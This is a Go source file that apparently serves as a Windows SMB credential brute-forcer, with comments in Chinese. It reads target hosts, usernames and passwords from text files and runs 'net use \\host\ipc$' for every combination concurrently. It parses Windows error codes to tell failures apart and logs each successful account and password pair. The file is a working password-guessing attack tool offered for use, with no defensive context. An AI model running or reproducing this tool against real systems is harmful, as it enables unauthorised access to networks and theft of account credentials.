package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
)

var wg1 sync.WaitGroup

//用来记录爆破成功的管道
var logChannel = make(chan string, 100)

func main() {

	exPath, _ := os.Getwd()
	fmt.Println(exPath)

	url_file := filepath.Join(exPath, "urls.txt")
	user_file := filepath.Join(exPath, "users.txt")
	password := filepath.Join(exPath, "passwords.txt")

	//go logger()
	//读取文件
	fp, err := os.Open(url_file)
	if err != nil {
		fmt.Println(err)
		panic("读取url文件失败:")
	}

	//读取账户名
	usersArr, err := ReadLine(user_file)

	if err != nil || len(usersArr) == 0 {
		panic("读取用户名文件失败,文件不能为空")
	}

	//读取密码
	pwdArr, err := ReadLine(password)
	if err != nil || len(pwdArr) == 0 {
		panic("读取密码文件失败,文件不能为空")
	}

	//fmt.Print(usersArr, pwdArr)

	buf := bufio.NewScanner(fp)

	for {
		if !buf.Scan() {
			break //文件读完了,退出for
		}
		url := buf.Text() //获取每一行
		command := exec.Command("cmd.exe", "/C", "chcp 65001")
		combinedOutput, err := command.CombinedOutput()

		if err != nil {
			fmt.Println(fmt.Sprint(err) + ": " + string(combinedOutput))
		}

		for _, user := range usersArr {
			for _, pwd := range pwdArr {
				wg1.Add(1)
				go func(url string, user string, pwd string) {
					//爆破ipc
					NetU(url, user, pwd)
					wg1.Done()
				}(url, user, pwd)
			}

		}

	}

	wg1.Wait()
	log.Println("===========所有爆破线程结束============")
	close(logChannel)
	select {
	case res := <-logChannel:
		fmt.Printf(res)
	default:
		fmt.Println("数据获取完毕")
		return
	}

}

func ReadLine(fileName string) ([]string, error) {
	f, err := os.Open(fileName)
	var nameList []string
	if err != nil {
		log.Println("Open File Error:", err)
		return nil, err
	}
	buf := bufio.NewReader(f)
	for {
		line, err := buf.ReadString('\n')
		line = strings.TrimSpace(line)
		if len(line) > 0 {
			nameList = append(nameList, line)
		}
		if err != nil {
			if err == io.EOF {
				log.Println("Read File Finish")
				//close(g.Tasks)
				return nameList, nil
			}
			log.Println("Read File Error:", err)
			return nil, err
		}
	}

	return nil, err
}

func NetU(url string, user string, password string) {

	cmd := exec.Command("net", "use", "\\\\"+url+"\\ipc$",
		password, "/user:"+user)

	raw_payload := "net use \\\\" + url + "\\ipc$" + "\t" + password + "\t" + "/user:" + user
	payload := fmt.Sprintf("[+] " + raw_payload)
	//log.Println(payload)

	output, _ := cmd.CombinedOutput()

	if strings.Contains(string(output), "1219") {
		//log.Println(string(output))
		log.Println(payload + "  [-] 目标" + url + " 已经存在连接")
		return
	} else if strings.Contains(string(output), "success") {

		log.Println(payload + "  [!] 爆破成功!!!!!!! 远程地址:" + url + " 账户为:" + user + " 密码为:" + password)
		logChannel <- fmt.Sprintf("[!] 爆破成功!! 远程地址:%s  账户为:%s   密码为:%s", url, user, password)

	} else if strings.Contains(string(output), "1326") {
		log.Println(payload + "  [-] 目标 " + url + "连接账号密码错误")

	} else if strings.Contains(string(output), "53") {
		log.Println(payload+"  [-] 目标 %s网络路径未找到", url)

	} else if strings.Contains(string(output), "1331") {
		log.Println(payload+" [-] 目标 %s 此用户无法登录，因为该帐户当前已被禁用", url)

	} else {
		log.Println(payload + "  [-] 目标 " + url + "爆破失败")
	}

}
